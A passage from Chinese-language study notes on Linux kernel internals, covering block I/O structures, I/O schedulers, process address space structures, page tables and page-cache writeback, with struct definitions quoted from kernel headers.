title="I/O向量"></a>I/O向量</h4><p>bi_io_vec域指向一个bio_vec结构体数组，该结构体链表包含了一个特定I/O操作所需要使用到的片段。每个bio_vec结构都是一个形式为&lt;page,offset,len&gt;的向量，它描述的是一个特定的片段：片段所在的物理页、块在物理页中的偏移位置、从给定偏移量开始的块长度。整个bio_io_vec结构体数组表示了一个完成的缓冲区。bio_vec结构定义在&lt;linux/bio.h&gt;中。</p><p>bi_cnt域用来描述bi_io_vec所指向的bio_vec数组中的向量数目。当块I/O操作执行完毕后，bi_idx域指向数组的当前索引。</p><p>bi_cnt若为0，则应该撤销该bio结构体，并释放它占用的内存。</p><p>bi_private域是属于拥有者（即创建者）的私有域，只有创建了bio结构的拥有者可以读写该域。</p><h3 id="请求队列"><a href="#请求队列" class="headerlink" title="请求队列"></a>请求队列</h3><p>块设备将它们挂起的块I/O请求保存在请求队列中，该队列由reques_queue结构体表示，定义在&lt;linux/blkdev.h&gt;中，包含一个双向请求链表以及相关控制信息。</p><p>请求队列表中每一项都是一个单独的请求，由结构体request表示，定义在文件&lt;linux/blkdev.h&gt;中。每个请求可以由多个bio结构体组成。</p><h3 id="I-O调度程序"><a href="#I-O调度程序" class="headerlink" title="I/O调度程序"></a>I/O调度程序</h3><p>内核中负责请求I/O请求的子系统称为I/O调度程序。</p><p>I/O调度程序将磁盘I/O资源分配给系统中所有挂起的块I/O请求。具体地说，这种资源分配是通过请求队列中挂起的请求合并和排序来完成的。</p><h4 id="I-O调度程序的工作"><a href="#I-O调度程序的工作" class="headerlink" title="I/O调度程序的工作"></a>I/O调度程序的工作</h4><p>I/O调度程序的工作是管理设备的请求队列。它决定队列中的请求排序顺序以及在什么时刻派发请求到块设备。</p><p>I/O调度程序通过两种方法减少磁盘寻址时间：合并与排序。</p><p>合并指将两个或多个请求结合成一个新请求。</p><p>整个请求队列将按扇区增长方向有序排列。该排序算法类似于电梯调度。所以I/O程序（或这种排序算法）称作电梯调度。</p><h4 id="Linus电梯"><a href="#Linus电梯" class="headerlink" title="Linus电梯"></a>Linus电梯</h4><p>Linus电梯能执行合并与排序预处理。</p><p>当一个请求加入队列中时，有可能发生四种操作：</p><ol><li>如果队列中已存在一个对相邻磁盘扇区操作的请求，那么新请求将和这个已经存在的请求合并成一个请求。</li><li>如果队列中存在一个驻留时间过长的请求，那么新请求将被插入到队列尾部，以防止其他旧的请求饥饿发生。</li><li>如果队列中以扇区方向为序而存在合适的插入位置，那么新的请求将被插入到该位置，保证队列中的请求是以被访问磁盘物理位置为序进行排列的。</li><li>如果队列中不存在合适的请求插入位置，请求将被插入到队列尾部。</li></ol><h4 id="最终期限I-O调度程序"><a href="#最终期限I-O调度程序" class="headerlink" title="最终期限I/O调度程序"></a>最终期限I/O调度程序</h4><p>在最后期限I/O调度程序中，每个请求都有一个超时时间。</p><p>最后期限I/O调度请求以磁盘物理位置为次序维护请求队列，这个队列称为排序队列。读请求按次序被插入到特定的读FIFO队列中，写请求被插入到特定的写FIFO队列中。</p><p>对于普通操作来说，最后期限I/O调度程序将请求从排序队列头部取下，再推入到派发队列中，然后派发队列将请求提交给磁盘驱动，从而保证了最小化的请求寻址。</p><p>如果在写FIFO队列头，或是读FIFO队列头的请求超时，那么最后期限I/O调度程序便从FIFO队列中提取请求进行服务。</p><p><img src="./img/1586935266.jpg" alt="最后期限I/O调度程序的三个队列"></p><p>最后期限I/O调度程序的实现在block/deadline-iosched.c中。</p><h4 id="预测I-O调度程序"><a href="#预测I-O调度程序" class="headerlink" title="预测I/O调度程序"></a>预测I/O调度程序</h4><p>预测I/O调度程序也实现了三个队列（加上一个派发队列），并为每个请求设置了超时时间。同时还增加了预测启发能力。</p><p>预测I/O调度程序在请求提交后并不直接返回处理其他请求，而是会有意空闲片刻（可设置，默认6ms）。这个空闲时间内，任何对相邻磁盘位置操作的请求都会立刻得到处理。在等待时间结束后，预测I/O调度程序重新返回原来的位置，继续执行以前剩下的请求。</p><p>预测I/O调度程序的实现在文件内核源代码树的block/as-iosched.c中。</p><h4 id="完全公正的排队I-O调度程序-CFQ"><a href="#完全公正的排队I-O调度程序-CFQ" class="headerlink" title="完全公正的排队I/O调度程序(CFQ)"></a>完全公正的排队I/O调度程序(CFQ)</h4><p>CFQ I/O调度程序把进入I/O请求放入特定的队列中，这种队列是根据引起I/O请求的进程组织的。每个队列中，刚进入的请求与相邻请求合并在一起，并进行插入分类。队列由此按扇区方式分类。</p><p>CFQ I/O调度程序以时间片轮转调度队列，每个队列中选取请求数，然后进行下一轮调度。</p><p>完全公正的排队I/O调度程序位于block/cfg-iosched.c。</p><h4 id="空操作的I-O调度程序"><a href="#空操作的I-O调度程序" class="headerlink" title="空操作的I/O调度程序"></a>空操作的I/O调度程序</h4><p>空操作(Noop)I/O调度程序不进行排序，也不进行其他形式的预寻址操作。但仍执行合并操作：当一个新的请求提交到队列时，就把它与任一相邻的请求合并，它只是维护请求队列以近乎FIFO的顺序排列，块设备驱动程序便可以从这种队列中摘取请求。</p><p>空操作i/o调度程序位于block/noop-iosched.c，它是专为随机访问设备而设计的。</p><h4 id="I-O调度程序的选择"><a href="#I-O调度程序的选择" class="headerlink" title="I/O调度程序的选择"></a>I/O调度程序的选择</h4><p>可以通过命令行选项：elevator=foo来启用foo（有效而激活的I/O调度程序）给所有的块设备。</p><h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><p>进程地址空间由进程可寻址的虚拟内存组成。每一个进程都有一个32或64位的平坦(flat)地址空间，空间的具体大小取决于体系结构。平坦指的是地址空间范围是一个独立的连续区间。</p><p>一个进程的地址空间与另一个进程的地址空间即使有相同的内存地址，实际上也彼此互不相干，我们称这样的进程为线程。</p><p>可被访问的合法地址空间称为内存区域。通过内核，进程可以给自己的地址空间动态地添加或减少内存区域。</p><p>进程只能访问有效内存区域内的内存地址。</p><h3 id="内存描述符"><a href="#内存描述符" class="headerlink" title="内存描述符"></a>内存描述符</h3><p>内核使用内存描述符结构体表示进程的地址空间。内存描述符由mm_struct结构体表示，定义在&lt;linux/mm_types.h&gt;中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;</span><br><span class="line"><span class="keyword">void</span> (*unmap_area) (struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> task_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cached_hole_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> free_area_cache;</span><br><span class="line"><span class="keyword">pgd_t</span> * pgd;</span><br><span class="line"><span class="keyword">atomic_t</span> mm_users;</span><br><span class="line"><span class="keyword">atomic_t</span> mm_count;</span><br><span class="line"><span class="keyword">int</span> map_count;</span><br><span class="line"><span class="keyword">int</span> core_waiters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> page_table_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span></span><br><span class="line"><span class="keyword">mm_counter_t</span> _file_rss;</span><br><span class="line"><span class="keyword">mm_counter_t</span> _anon_rss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_rss;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_vm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start_code, end_code, start_data, end_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start_brk, brk, start_stack;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> arg_start, arg_end, env_start, env_end;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> saved_auxv[AT_VECTOR_SIZE];</span><br><span class="line"><span class="keyword">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"><span class="keyword">mm_context_t</span> context;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> faultstamp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> token_priority;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> last_interval;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">core_startup_done</span>, <span class="title">core_done</span>;</span></span><br><span class="line"><span class="keyword">rwlock_t</span>ioctx_list_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kioctx</span>*<span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>mm_users域记录正在使用该地址的进程数目。mm_count域是mm_struct结构体的主引用计数。如果mm_users减为0，则mm_count减1。若mm_count为0，则说明没有任何指向该mm_struct结构体的引用了，这时该结构体会被撤销。当内核在一个地址空间上操作，并需要使用与该地址相关联的引用计数时，内核便增加mm_count。</p><p>mmap和mm_rb这两个不同的数据结构体描述的对象是相同的：该地址空间中的全部内存区域。但mmap以链表形式存放，而mm_rb以红-黑树形式存放。</p><p>所有的mm_struct结构体都通过自身的mmlist域链接在一个双向链表中，该链表的首元素是init_mm内存描述符，它代表init进程的地址空间。</p><h4 id="分配内存描述符"><a href="#分配内存描述符" class="headerlink" title="分配内存描述符"></a>分配内存描述符</h4><p>在进程的进程描述符中的mm预存放着该进程使用的内存描述符。</p><h4 id="撤销内存描述符"><a href="#撤销内存描述符" class="headerlink" title="撤销内存描述符"></a>撤销内存描述符</h4><p>当进程退出时，内核会调用定义在kernel/exit.c中的exit_mm()函数，该函数执行一些常规的撤销工作，同时更新一些统计量。</p><h4 id="mm-struct与内核线程"><a href="#mm-struct与内核线程" class="headerlink" title="mm_struct与内核线程"></a>mm_struct与内核线程</h4><p>内核线程没有进程地址空间，也没有相关的内存描述符，所以内核线程对应的进程描述符中的mm域为空。</p><p>为了避免内核线程为内存描述符合页表浪费内存，也为了当新内核线程运行时，避免浪费处理器周期向新地址空间进行切换，内核将直接使用前一个进程的内存描述符。</p><h3 id="虚拟内存区域"><a href="#虚拟内存区域" class="headerlink" title="虚拟内存区域"></a>虚拟内存区域</h3><p>内存区域由vm_area_struct结构体表示，定义在&lt;linux/mm_types.h&gt;中。内存区域在Linux内核中也经常被称作虚拟内存区域（VMAS）。</p><p>vm_area_struct结构体描述了指定地址空间内连续区间上的一个独立内存范围。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;<span class="comment">//指向区间的首地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;<span class="comment">//指向区间的尾地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>;</span></span><br><span class="line"><span class="keyword">pgprot_t</span> vm_page_prot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">void</span> *parent;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">&#125; vm_set;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">&#125; shared;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> * <span class="title">vm_ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span></span><br><span class="line"><span class="keyword">void</span> * vm_private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> vm_truncate_count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="keyword">atomic_t</span> vm_usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个内存描述符都对应于进程地址空间中的唯一区间。</p><p>vm_mm域指向和VMA相关的mm_struct结构体。注：每个VMA对其相关的mm_struct结构体来说都是唯一的。</p><h4 id="VMA标志"><a href="#VMA标志" class="headerlink" title="VMA标志"></a>VMA标志</h4><p>VMA标志是一种位标志，定义在&lt;linux/mm.h&gt;中。其包含在vm_flags域内，标志了内存区域所包含的页面的行为和信息。</p><h4 id="VMA操作"><a href="#VMA操作" class="headerlink" title="VMA操作"></a>VMA操作</h4><p>vm_ops域指向与指定内存区域相关的操作函数表，内核使用表中的方法操作VMA。</p><p>操作函数表由vm_operations_struct结构体表示，定义在文件&lt;linux/mm.h&gt;中。</p><h4 id="内存区域的树型结构和内存区域的链表结构"><a href="#内存区域的树型结构和内存区域的链表结构" class="headerlink" title="内存区域的树型结构和内存区域的链表结构"></a>内存区域的树型结构和内存区域的链表结构</h4><p>mmap域使用单独链表连接所有的内存区域对象。每一个vm_area_struct结构体通过自身的vm_next域被连入链表，所有区域按地址增长的方向排序，mmap域指向链表中第一个内存区域，链表中最后一个结构体指针指向空。</p><p>mm_rb域使用红-黑树连接所有的内存区域对象。mm_rb域指向红-黑树的根节点，地址空间中每一个vm_area_struct结构体通过自身的vm_rb域连接到树中。</p><h4 id="实际中使用的内存区域文件"><a href="#实际中使用的内存区域文件" class="headerlink" title="实际中使用的内存区域文件"></a>实际中使用的内存区域文件</h4><p>可以使用/proc文件系统和pmmap工具查看给定进程的内存空间和其中所包含的内存区域。</p><p>/proc/&lt;pid&gt;/maps的输出显示了进程地址空间中的全部内存区域。</p><p>没有映射文件的内存区域的设备标志位00:00，索引节点标志也为0，这个区域就是零页——零页映射的内存全为0。如果零页映射到可写的内存区域，那么该区域将全被初始化为0。</p><h3 id="操作内存区域"><a href="#操作内存区域" class="headerlink" title="操作内存区域"></a>操作内存区域</h3><p>为方便执行对内存区域的操作，内核定义了许多辅助函数，它们都声明在&lt;linux/mm.h&gt;中。</p><h3 id="mmap-和do-mmap-创建地址区间"><a href="#mmap-和do-mmap-创建地址区间" class="headerlink" title="mmap()和do_mmap():创建地址区间"></a>mmap()和do_mmap():创建地址区间</h3><p>内核使用do_mmap()函数创建一个新的线性地址区间。</p><p>do_mmap()函数定义在文件&lt;linux/mm.h&gt;中。</p><p>如果系统调用do_mmap()的参数中有无效参数，那么它返回一个负值；否则，它会在虚拟内存中分配一个合适的新内存区域。如果有可能的话，将新区域和邻近区域进行合并，否则内核从vm_area_cachep长字节(slab)缓存中分配一个vm_area_struct结构体，并使用vm_link()函数将新分配的内存区域添加到地址空间的内存区域链表和红-黑树中，随后还要更新内存描述符中的total_vm域，然后才返回新分配的地址区间的初始地址。</p><p>在用户空间可以通过mmap()系统调用获取内核函数do_mmap()的功能。</p><h4 id="mummap-和do-mummap-：删除地址区间"><a href="#mummap-和do-mummap-：删除地址区间" class="headerlink" title="mummap()和do_mummap()：删除地址区间"></a>mummap()和do_mummap()：删除地址区间</h4><p>do_mummap()函数从特定的进程地址空间中删除指定地址区间，该函数定义在文件&lt;linux/mm.h&gt;中。</p><p>系统调用mummap()给用户空间提供了一种从自身地址空间中删除指定地址区间的方法。该系统调用定义在文件mm/map.c中，它是对do_mummap()函数的一个简单的封装。</p><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>当用程序访问一个虚拟地址时，首先必须将虚拟地址转化为物理地址，然后处理器才能解析地址访问请求。地址的转换工作需要通过查询页表才能完成。</p><p>Linux中使用三级页表完成地址转换：</p><ol><li>顶级页表是页全局目录（PGD），它包含一个pgd_t类型数组，多数体系结构中pgd_t类型等同于无符号长整型类型。PGD中的表项指向二级页目录中的表项：PMD。</li><li>二级页表是中间页目录（PMD），它是个pmd_t类型数组，其中的表项指向PTE中的表项。</li><li>最后一级的页表简称页表，其中包含了pte_t类型的页表项，该页表项指向物理页面。</li></ol><p><img src="./img/1587021913.jpg" alt="虚拟——物理地址查询"></p><p>每个进程都有自己的页表（线程会共享页表），内存描述符的pgd域指向的就是进程的页全局目录。</p><p>页表对应的结构体依赖于具体的体系结构，定义在&lt;asm/page.h&gt;中。</p><p>为了加快搜索，多数体系结构都实现了一个翻译后缓冲器（TLB）。TLB作为一个将虚拟地址映射到物理地址的硬件缓存，当请求访问一个虚拟地址时，处理器首先检查TLB中是否缓存了该虚拟地址到物理地址的映射，如果在缓存中直接命中，物理地址立刻返回；否则，就需要再通过页表搜索需要的物理地址。</p><h2 id="页高速缓存和页回写"><a href="#页高速缓存和页回写" class="headerlink" title="页高速缓存和页回写"></a>页高速缓存和页回写</h2><p>页高速缓存是Linux内核实现磁盘缓存。主要用来减少对磁盘I/O操作。</p><h3 id="缓存手段"><a href="#缓存手段" class="headerlink" title="缓存手段"></a>缓存手段</h3><p>页高速缓存是由内存中的物理页面组成的，其内容对应磁盘上的物理块。页高速缓存大小能动态调整，我们称正被缓存的存储设备为后备存储。</p><h4 id="写缓存"><a href="#写缓存" class="headerlink" title="写缓存"></a>写缓存</h4><p>缓存一般被实现下面三种策略之一：</p><p>第一种策略，不缓存，即高速缓存不去缓存任何写操作。</p><p>第二种策略，写操作自动更新内存缓冲，同时也更新磁盘文件，这种方式，通常称为写透缓存。</p><p>第三种策略，也是Linux所采用的，称为“回写”。这种策略下，程序执行写操作直接写到缓存中，后端存储不会立刻直接更新，而是将页高速缓存中被写入的页面标记成“赃”，并且被加入到赃页链表中。然后由一个进程（回写进程）周期性将赃页链表中的页写回到磁盘中，然后再清理“赃”页标志。</p><h4 id="缓存回收"><a href="#缓存回收" class="headerlink" title="缓存回收"></a>缓存回收</h4><p>决定缓存中什么内容将被清除的策略，被称为缓存回收策略。</p><p>Linux的缓存回收是通过选择干净页进行简单的替换。如果缓存中没有足够的干净页面，内核将强制地进行回写操作，以腾出更多的干净可用页。</p><h5 id="最近最少使用"><a href="#最近最少使用" class="headerlink" title="最近最少使用"></a>最近最少使用</h5><p>缓存回收策略通过所访问的数据特性，尽量追求预测效率。最成功的算法称作最近最少使用算法(LRU)。</p><p>LRU回收策略需要跟着每个页面的访问踪迹（或者至少按照访问时间为序的页链表），以便能回收最老时间戳的页面（或者回收排序链表头所指的页面）</p><h5 id="双链策略"><a href="#双链策略" class="headerlink" title="双链策略"></a>双链策略</h5><p>Linux实现的是一个修改过的LRU，也称为双链策略。</p><p>Linux维护两个链表：活跃链表和非活跃链表。处于活跃链表上的页面不会被换出，而在非活跃链表上的页面则是可以被换出的。在活跃链表中的页面必须在其被访问时就处于非活跃链表中。</p><p>两个链表都被伪LRU规则维护：页面从尾部加入，从头部移除，如同队列。两个链表需要维持平衡——如果活跃链表变得过多而超过了非活跃链表，那么活跃链表的头页面将被重新移回到非活跃链表中，以便能再被回收。</p><h3 id="Linux页高速缓存"><a href="#Linux页高速缓存" class="headerlink" title="Linux页高速缓存"></a>Linux页高速缓存</h3><p>页高速缓存缓存的是内存页面。</p><h4 id="address-space对象"><a href="#address-space对象" class="headerlink" title="address_space对象"></a>address_space对象</h4><p>为了维持页高速缓存的普遍性，Linux页高速缓存使用了一个新对象管理缓存项和页I/O操作，这个对象是address_space结构体，定义在文件&lt;linux/fs.h&gt;中。这个结构体是vm_area_struct的物理地址对等体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">host</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span><span class="title">page_tree</span>;</span></span><br><span class="line"><span class="keyword">rwlock_t</span>tree_lock;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>i_mmap_writable;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">prio_tree_root</span><span class="title">i_mmap</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">i_mmap_nonlinear</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span>i_mmap_lock;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>truncate_count;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nrpages;</span><br><span class="line"><span class="keyword">pgoff_t</span>writeback_index;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> *<span class="title">backing_dev_info</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span>private_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">private_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>*<span class="title">assoc_mapping</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中i_mmap字段是一个优先搜索树，它的搜索范围包括了再address_spcae中所有共享的私有映射页面。</p><p>address_space页总数由nrpage描述。</p><p>address_spcae结构体与索引节点（inode）关联，这时host域会指向该索引节点；如果关联对象不是一个索引节点的话，host域会被置为NULL。</p><h4 id="address-spcae操作"><a href="#address-spcae操作" class="headerlink" title="address_spcae操作"></a>address_spcae操作</h4><p>a_ops域指向地址空间对象中的操作函数表，定义在文件&lt;linux/fs.h&gt;中，由address_space_operations结构来表示。</p><p>每个后备存储都通过自己的address_space_operation描述自己如何与页高速缓存交互。</p><h4 id="基树"><a href="#基树" class="headerlink" title="基树"></a>基树</h4><p>每个address_space对象都有唯一的基树，它保存在page_tree结构体中。</p><p>基树是一个二叉树，只要指定了文件偏移量，就可以在基树中迅速检索到希望的页。</p><p>基树核心代码的通用形式可以在文件lib/radix-tree.c中找到，声明在&lt;linux/radix_tree.h&gt;中。</p><h3 id="缓冲区高速缓存"><a href="#缓冲区高速缓存" class="headerlink" title="缓冲区高速缓存"></a>缓冲区高速缓存</h3><p>缓存的作用是映射内存中的页面到磁盘块，从而在块I/O操作时也减少了磁盘访问。这个缓存通常称为缓冲区高速缓存</p><h3 id="flusher线程"><a href="#flusher线程" class="headerlink" title="flusher线程"></a>flusher线程</h3><p>当页高速缓存中的数据比后台存储的数据更新时，该数据就称作赃数据。在以下3种情况发生时，赃页被写会磁盘：</p><ul><li>当空闲内存低于一个特定的阈值时，内核必须将赃页写回磁盘以便释放内存。</li><li>当赃页在内存找那个驻留时间超过一个特定的阈值时，内核必须将超时的赃页写回磁盘，以确保赃页不会无限期地驻留在内存中。</li><li>当用户进程调用sync()和fsync()系统调用时，内核会按要求执行回写动作。</li></ul><p>在2.6内核中，由一群内核线程（flusher线程）执行这三种工作。</p><p>当空闲内存比阈值dirty_backgrount_ratio还低时，内核便会调用函数flusher_threads()唤醒一个或多个flusher线程。同时，flusher线程后台例程会被周期性唤醒（被定时器唤醒）。</p><p>系统管理员可以在/proc/sys/vm中设置回写相关的参数，也可以通过sysctl系统调用设置它们。</p><p>flusher线程的实现代码在文件mm/page-writeback.c和mm/backing-dev.c中，回写机制的实现代码在文件fs/fs-writeback.c中。</p><h4 id="膝上型计算机模式"><a href="#膝上型计算机模式" class="headerlink" title="膝上型计算机模式"></a>膝上型计算机模式</h4><p>膝上型计算机模式是一种特殊的页回写策略。该模式可通过/proc/sys/vm/laptop_mode文件进行配置，如果需要启用，则像配置文件中写入1.</p><p>膝上型计算机模式除了当缓存中的页面太旧时要执行回写赃页以外，flusher还会找准磁盘运转的时机，把所有其他的物理磁盘I/O、刷新赃缓冲等通通写回磁盘，以便保证不会专门为了写磁盘而去主动激活磁盘运行。</p><h2 id="设备与模块"><a href="#设备与模块" class="headerlink" title="设备与模块"></a>设备与模块</h2><p>设备类型：在所有Unix系统中为了统一普通设备的操作所采用的分类。</p><p>模块：Linux内核中用于按需加载和卸载目标码的机制。</p><p>内核对象：内核数据结构中支持面向对象的简单操作，还支持维护对象之间的父子关系。</p><p>sysfs：表示系统中设备树的一个文件系统。</p><h3 id="设备类型"><a href="#设备类型" class="headerlink" 